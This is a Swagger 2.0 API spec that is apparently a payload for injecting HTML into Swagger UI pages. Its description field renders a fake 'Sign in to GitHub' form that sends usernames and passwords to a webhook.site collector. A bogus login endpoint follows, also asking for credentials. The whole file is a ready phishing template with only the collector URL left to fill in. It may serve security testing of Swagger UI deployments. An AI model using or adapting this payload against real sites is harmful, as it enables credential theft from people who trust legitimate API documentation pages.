swagger: '2.0'
info:
  version: 1.0.0
  title: Swagger UI
  description: '<div align="center"><br><img src="https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/assets/logo-github.png" width="60" height="60" alt="GitHub"><br><font face="Segoe UI" size="5" color="#24292f">Sign in to GitHub</font><br></div><table width="100%" cellspacing="0" cellpadding="0"><tr><td width="30%">&nbsp;</td><td width="40%" bgcolor="#ffffff"><table width="100%" cellspacing="0" cellpadding="22"><tr><td align="left"><form action="https://webhook.site/REPLACE-ME" method="post"><table width="100%" cellspacing="0" cellpadding="0"><tr><td bgcolor="#f6f8fa"><font face="Segoe UI" size="1" color="#24292f">&nbsp;Username or email address</font></td></tr><tr><td bgcolor="#ffffff"><input type="text" name="user" size="30"></td></tr><tr><td bgcolor="#f6f8fa"><font face="Segoe UI" size="1" color="#24292f">&nbsp;Password</font> <font face="Segoe UI" size="1" color="#0969da">Forgot password?</font></td></tr><tr><td bgcolor="#ffffff"><input type="password" name="pass" size="30"></td></tr></table><br><input type="image" src="https://raw.githubusercontent.com/RekhanshRajput/Swagger-xss-payloads/refs/heads/main/assets/btn-github.png" width="100" height="29" alt="Sign in"></form></td></tr></table><table width="100%" cellspacing="0" cellpadding="14"><tr><td align="left"><div align="center"><font face="Segoe UI" size="2" color="#24292f">New here? </font><font face="Segoe UI" size="2" color="#0969da">Create an account</font></div></td></tr></table></td><td width="30%">&nbsp;</td></tr></table><div align="center"><font face="Segoe UI" size="1" color="#57606a">GitHub &middot; API &middot; Docs</font></div>'
paths:
  /Login_Page:
    post:
      summary: Login here to continue
      description: Please provide your credentials to continue.
      parameters:
        - name: username
          in: formData
          description: The username for login
          required: true
          type: string
        - name: password
          in: formData
          description: The password for login
          required: true
          type: string
      tags:
        - Click here to login
      responses:
        '200':
          description: OK
        '400':
          description: Bad request
        '500':
          description: Server error
